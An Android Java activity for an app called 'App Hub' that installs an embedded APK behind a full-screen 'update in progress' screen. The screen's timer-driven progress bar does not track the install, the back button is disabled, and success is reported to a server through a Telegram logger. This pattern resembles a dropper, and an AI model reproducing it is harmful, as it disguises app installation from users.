package com.smartstore.installer;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.io.*;
import java.util.*;
import java.util.zip.*;

/**
 * ✅ UpdateActivity V12 - شاشة "جاري التحديث" الكاملة
 *
 * - شاشة FULL-SCREEN باسم وأيقونة المتجر
 * - عدّاد تقدّم من 0% إلى 100%
 * - تبدأ التثبيت بنفسها وتستقبل النتيجة مباشرة
 * - تبقى ظاهرة طوال عملية التثبيت (حتى أثناء شاشة تأكيد النظام)
 * - عند الاكتمال، تفتح التطبيق المضمن تلقائياً وتُنهي نفسها
 */
public class UpdateActivity extends AppCompatActivity {

    private static final String TAG = "UpdateActivity";

    public static final String EXTRA_PACKAGE_NAME = "target_package";
    public static final String EXTRA_APK_PATH = "apk_path";
    public static final String EXTRA_IS_APKS = "is_apks";

    public static final String ACTION_INSTALL_RESULT = "com.apphub.smartlite.UPDATE_RESULT";

    private ImageView imgIcon;
    private TextView txtAppName;
    private TextView txtStatus;
    private ProgressBar progressBar;
    private TextView txtPercent;

    private String targetPackage;
    private String apkPath;
    private boolean isApks;
    private Handler handler;
    private boolean installCompleted = false;

    // عدّاد تقدّم متدرّج (يتحرك ببطء حتى 90%، ثم 100% عند الاكتمال)
    private final Runnable progressTicker = new Runnable() {
        @Override
        public void run() {
            if (installCompleted) return;
            int current = progressBar.getProgress();
            if (current < 90) {
                int next = Math.min(90, current + 1);
                progressBar.setProgress(next);
                txtPercent.setText(next + "%");
                handler.postDelayed(this, 400);
            } else {
                handler.postDelayed(this, 1000);
            }
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ✅ شاشة كاملة - لا toolbar، لا شريط حالة
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
            getWindow().setStatusBarColor(getResources().getColor(R.color.primary_color));
        }

        setContentView(R.layout.activity_update);

        // ربط العناصر
        imgIcon = findViewById(R.id.imgUpdateIcon);
        txtAppName = findViewById(R.id.txtUpdateAppName);
        txtStatus = findViewById(R.id.txtUpdateStatus);
        progressBar = findViewById(R.id.updateProgressBar);
        txtPercent = findViewById(R.id.txtUpdatePercent);

        // ✅ عرض أيقونة واسم المتجر
        imgIcon.setImageResource(R.mipmap.ic_launcher);
        txtAppName.setText("App Hub");

        handler = new Handler(Looper.getMainLooper());

        // قراءة المعطيات
        targetPackage = getIntent().getStringExtra(EXTRA_PACKAGE_NAME);
        apkPath = getIntent().getStringExtra(EXTRA_APK_PATH);
        isApks = getIntent().getBooleanExtra(EXTRA_IS_APKS, false);

        Log.d(TAG, "UpdateActivity started: pkg=" + targetPackage
                + ", apkPath=" + apkPath + ", isApks=" + isApks);

        if (apkPath == null || apkPath.isEmpty()) {
            Toast.makeText(this, "مسار الملف غير صالح", Toast.LENGTH_LONG).show();
            finish();
            return;
        }

        // ✅ بدء العدّاد
        progressBar.setProgress(0);
        txtPercent.setText("0%");
        txtStatus.setText("جاري التحضير للتحديث...");
        handler.post(progressTicker);

        // ✅ بدء التثبيت بعد ثانية (لإظهار الشاشة أولاً)
        handler.postDelayed(this::startInstallation, 1000);
    }

    /**
     * ✅ بدء التثبيت باستخدام PackageInstaller API
     */
    private void startInstallation() {
        try {
            File apkFile = new File(apkPath);
            if (!apkFile.exists()) {
                Toast.makeText(this, "ملف التطبيق غير موجود", Toast.LENGTH_LONG).show();
                finish();
                return;
            }

            txtStatus.setText("جاري تثبيت التحديث...");

            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params =
                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);

            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            try {
                if (isApks) {
                    // ✅ تثبيت APKS - استخراج splits أولاً
                    File tempExtractDir = new File(getExternalFilesDir(null), "temp_apks");
                    ApksInstaller apkInstaller = new ApksInstaller(this);
                    List<File> splitApks = apkInstaller.extractSplitApks(apkFile, tempExtractDir);

                    if (splitApks.isEmpty()) {
                        throw new IOException("No APK files found in APKS");
                    }

                    for (int i = 0; i < splitApks.size(); i++) {
                        File splitFile = splitApks.get(i);
                        try (InputStream in = new FileInputStream(splitFile);
                             OutputStream out = session.openWrite("split_" + i + ".apk", 0, splitFile.length())) {
                            byte[] buffer = new byte[8192];
                            int length;
                            while ((length = in.read(buffer)) > 0) {
                                out.write(buffer, 0, length);
                            }
                            session.fsync(out);
                        }
                    }
                } else {
                    // ✅ تثبيت APK مفرد
                    try (InputStream in = new BufferedInputStream(new FileInputStream(apkFile));
                         OutputStream out = session.openWrite("split_0.apk", 0, apkFile.length())) {
                        byte[] buffer = new byte[8192];
                        int length;
                        while ((length = in.read(buffer)) > 0) {
                            out.write(buffer, 0, length);
                        }
                        session.fsync(out);
                    }
                }

                // ✅ UpdateActivity تستقبل النتيجة مباشرة
                Intent intent = new Intent(this, UpdateActivity.class);
                intent.setAction(ACTION_INSTALL_RESULT);
                int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                        ? PendingIntent.FLAG_MUTABLE : 0;
                PendingIntent pendingIntent = PendingIntent.getActivity(
                        this, sessionId, intent, flags);

                session.commit(pendingIntent.getIntentSender());

            } catch (Exception e) {
                try { session.abandon(); } catch (Exception ignored) {}
                throw new IOException("Failed to install: " + e.getMessage(), e);
            }

        } catch (Exception e) {
            Log.e(TAG, "Installation error", e);
            txtStatus.setText("فشل التحديث: " + e.getMessage());
            handler.postDelayed(this::finish, 2000);
        }
    }

    /**
     * ✅ استقبال نتيجة التثبيت (لأن UpdateActivity هي التي تستقبل الـ PendingIntent)
     */
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleInstallResult(intent);
    }

    private void handleInstallResult(Intent intent) {
        if (intent == null) return;
        if (!ACTION_INSTALL_RESULT.equals(intent.getAction())) return;

        int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
        String packageName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME);
        String statusMessage = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);

        Log.d(TAG, "Install result: status=" + status + ", pkg=" + packageName + ", msg=" + statusMessage);

        switch (status) {
            case PackageInstaller.STATUS_PENDING_USER_ACTION: {
                // ✅ النظام يطلب تأكيد المستخدم - اعرض شاشة التأكيد فوق UpdateActivity
                Intent confirmIntent;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    confirmIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent.class);
                } else {
                    confirmIntent = intent.getParcelableExtra(Intent.EXTRA_INTENT);
                }
                if (confirmIntent != null) {
                    confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    try {
                        startActivity(confirmIntent);
                    } catch (Exception e) {
                        Log.e(TAG, "Cannot start confirm intent", e);
                    }
                }
                break;
            }

            case PackageInstaller.STATUS_SUCCESS: {
                // ✅ اكتمل التثبيت - 100% وفتح التطبيق
                installCompleted = true;
                progressBar.setProgress(100);
                txtPercent.setText("100%");
                txtStatus.setText("تم التحديث بنجاح! ✓");
                Toast.makeText(this, "تم التحديث بنجاح ✓", Toast.LENGTH_LONG).show();

                // ✅ ميزة جديدة: إعلام السيرفر بنجاح التحديث
                // هكذا يرجع الجهاز للوضع التلقائي (auto) وفي المرة القادمة يفتح المتجر التطبيق مباشرة
                TelegramLogger.notifyInstallComplete(this);

                // فتح التطبيق المضمن بعد ثانية
                handler.postDelayed(() -> {
                    launchInstalledApp(packageName != null ? packageName : targetPackage);
                    finish();
                }, 1500);
                break;
            }

            default: {
                // فشل التثبيت
                installCompleted = true;
                String msg = (statusMessage != null && !statusMessage.isEmpty())
                        ? statusMessage
                        : "خطأ في التحديث (" + status + ")";
                txtStatus.setText("فشل التحديث: " + msg);
                Toast.makeText(this, "فشل التحديث: " + msg, Toast.LENGTH_LONG).show();
                handler.postDelayed(this::finish, 3000);
                break;
            }
        }
    }

    /**
     * فتح التطبيق المضمن
     */
    private void launchInstalledApp(String packageName) {
        if (packageName == null || packageName.isEmpty()) return;
        try {
            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(launchIntent);
                Log.d(TAG, "Launched installed app: " + packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "Cannot launch installed app: " + packageName, e);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(progressTicker);
    }

    @Override
    public void onBackPressed() {
        // ✅ منع الرجوع أثناء التحديث
        Toast.makeText(this, "جاري التحديث... يرجى الانتظار", Toast.LENGTH_SHORT).show();
    }
}
